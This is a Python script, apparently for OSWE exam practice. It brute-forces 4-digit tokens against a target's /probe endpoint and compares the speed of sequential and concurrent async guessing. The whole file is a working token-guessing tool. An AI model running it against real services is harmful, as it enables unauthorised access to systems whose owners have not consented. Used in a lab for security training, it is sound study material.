import argparse
import asyncio
import sys
import time

import httpx


def create_list(min: int, max: int) -> list[str]:
    numbers = list(range(min, max + 1))
    return [str(number).zfill(4) for number in numbers]


def generate_urls(target: str, port: int, tokens: list) -> list[str]:
    url_partial = f"http://{target}:{port}/probe?candidate="
    return [f"{url_partial}{token}" for token in tokens]


def sync_validate_token(urls: list[str]) -> str | None:
    client = httpx.Client(timeout=2.0)
    for url in urls:
        response = client.get(url)
        if response.status_code == 200:
            return url

    return None


async def spray_token(
    urls: list[str],
    concurrency: int = 10,
) -> str | None:
    queue: asyncio.Queue[str] = asyncio.Queue()
    for url in urls:
        queue.put_nowait(url)

    found_event = asyncio.Event()
    result: dict[str, str | None] = {"url": None}

    async with httpx.AsyncClient(timeout=2.0) as client:

        async def worker(worker_id: int):
            while not found_event.is_set():
                try:
                    url = queue.get_nowait()
                except asyncio.QueueEmpty:
                    return

                try:
                    response = await client.get(url)
                    if response.status_code == 200:
                        result["url"] = url
                        found_event.set()
                        return
                except httpx.RequestError:
                    pass
                finally:
                    queue.task_done()

        tasks = [asyncio.create_task(worker(i)) for i in range(concurrency)]

        await asyncio.wait(
            tasks,
            return_when=asyncio.FIRST_COMPLETED,
        )

        # Cancel remaining workers
        for task in tasks:
            task.cancel()

    return result["url"]


def summarize(name: str, timings: list[float]):
    avg = sum(timings) / len(timings)
    print(f"\n{name} results over {len(timings)} runs:")
    print(f"  min: {min(timings):.4f}s")
    print(f"  max: {max(timings):.4f}s")
    print(f"  avg: {avg:.4f}s")


def parse_args():
    parser = argparse.ArgumentParser(description="OSWE Application Exploit.")

    # --- Target options ---
    target_group = parser.add_argument_group("Target options")
    target_group.add_argument(
        "--target-ip", type=str, required=True, help="Target server IP address"
    )
    target_group.add_argument(
        "--target-port",
        type=int,
        default=80,
        help="Target web frontend port (default: 80)",
    )

    parser.add_argument(
        "--concurrency", type=int, default=5, help="Number of concurrent tasks to run"
    )
    parser.add_argument("--runs", type=int, default=10, help="Number of benchmark runs")

    return parser.parse_args()


async def main():
    args = parse_args()
    print(f"Target IP: {args.target_ip}")
    print(f"Target Port: {args.target_port}")
    print(f"Concurrency: {args.concurrency}")
    print(f"Runs: {args.runs}")

    token_list = create_list(0, 5000)
    urls = generate_urls(args.target_ip, args.target_port, token_list)

    # linear_times: list[float] = []
    # async_times: list[float] = []

    for j in range(args.concurrency, args.concurrency + 50, 5):
        print(f"\n--- Concurrency {j} ---")
        linear_times: list[float] = []
        async_times: list[float] = []

        time.sleep(5.0)

        for i in range(1, args.runs + 1):
            print(f"\n--- Run {i}/{args.runs} ---")

            # --- Linear ---
            start = time.perf_counter()
            linear_result = sync_validate_token(urls)
            end = time.perf_counter()

            if linear_result is None:
                print("[!] Linear: token not found")
                sys.exit(1)

            linear_time = end - start
            linear_times.append(linear_time)
            print(f"[+] Linear: {linear_time:.4f}s → {linear_result}")

            time.sleep(5.0)

            # --- Async ---
            start = time.perf_counter()
            async_result = await spray_token(urls, j)
            end = time.perf_counter()

            if async_result is None:
                print("[!] Async: token not found")
                sys.exit(1)

            async_time = end - start
            async_times.append(async_time)
            print(f"[+] Async:  {async_time:.4f}s → {async_result}")

        # --- Summary ---
        summarize("Linear", linear_times)
        summarize("Async", async_times)

        speedup = (
            (sum(linear_times) / sum(async_times))
            if sum(async_times) > 0
            else float("inf")
        )
        print(f"\nOverall speedup: {speedup:.2f}×")


if __name__ == "__main__":
    asyncio.run(main())
